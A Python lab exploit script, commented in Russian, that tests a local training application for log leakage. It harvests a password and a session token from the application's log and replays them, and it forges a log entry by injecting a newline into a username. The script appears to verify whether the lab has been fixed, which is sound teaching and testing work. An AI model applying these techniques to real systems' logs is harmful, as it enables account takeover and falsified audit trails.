"""Эксплойт лабы: что уносится из журнала, получившего читателя.

Три опыта: пароль из записи о входе, токен сессии из записи о выдаче,
поддельная строка через перевод строки в имени пользователя. Сценарий
проигрывается локально: сначала «пользователь» работает с приложением,
потом «атакующий» читает журнал. К сети лаба не обращается, против
чужих систем неприменима.

Код возврата:
    0 — эксплойт НЕ сработал (лаба починена)
    1 — эксплойт сработал (лаба ещё уязвима)
"""

import re
import sys

from labtarget import load

# Учётные записи постановки: атакующий их не знает, знает журнал.
USERS = {"anna": "qwerty2026", "boris": "Tg7#kLp2!wQa"}


def experiment_1_password(lab):
    """Пароль лежит в записи о входе и подходит для повторного входа."""
    lab.reset()
    lab.login("anna", USERS["anna"])  # настоящий вход пользователя
    stolen = None
    for line in lab.dump_log():
        match = re.search(r"password=(\S+)", line)
        if match:
            stolen = match.group(1)
    print(f"  опыт 1 — пароль, найденный в журнале: {stolen!r}")
    if stolen is None:
        return False
    return lab.login("anna", stolen) is not None


def experiment_2_token(lab):
    """Токен сессии лежит в записи о выдаче и открывает чужой отчёт."""
    lab.reset()
    lab.login("boris", USERS["boris"])  # настоящий вход пользователя
    stolen = None
    for line in lab.dump_log():
        match = re.search(r"token=(\S+)", line)
        if match:
            stolen = match.group(1)
    if stolen is None:
        print("  опыт 2 — токена в журнале нет")
        return False
    report = lab.read_report(stolen)
    print(f"  опыт 2 — отчёт по токену из журнала: {report!r}")
    return report is not None


def experiment_3_forged_line(lab):
    """Перевод строки в имени пользователя печатает поддельную запись."""
    lab.reset()
    forged = "anna\n2000-01-01T00:00:00 event=login user=anna result=ok"
    lab.login(forged, "x")  # атакующий шлёт вход с неверным паролем
    physical = [part for line in lab.dump_log() for part in line.split("\n")]
    fake = [ln for ln in physical if ln.startswith("2000-01-01")]
    print(f"  опыт 3 — поддельных записей в журнале после отказа: "
          f"{len(fake)}")
    return bool(fake)


def main() -> int:
    name, lab = load()
    print(f"Цель: {name}")
    leaked_password = experiment_1_password(lab)
    replayed_token = experiment_2_token(lab)
    forged_line = experiment_3_forged_line(lab)
    if leaked_password or replayed_token or forged_line:
        print("ЭКСПЛОЙТ СРАБОТАЛ: журнал отдаёт секреты или принимает "
              "подделку.")
        return 1
    print("ЭКСПЛОЙТ НЕ СРАБОТАЛ: ни пароля, ни токена, ни поддельной "
          "строки в журнале нет.")
    return 0


if __name__ == "__main__":
    sys.exit(main())
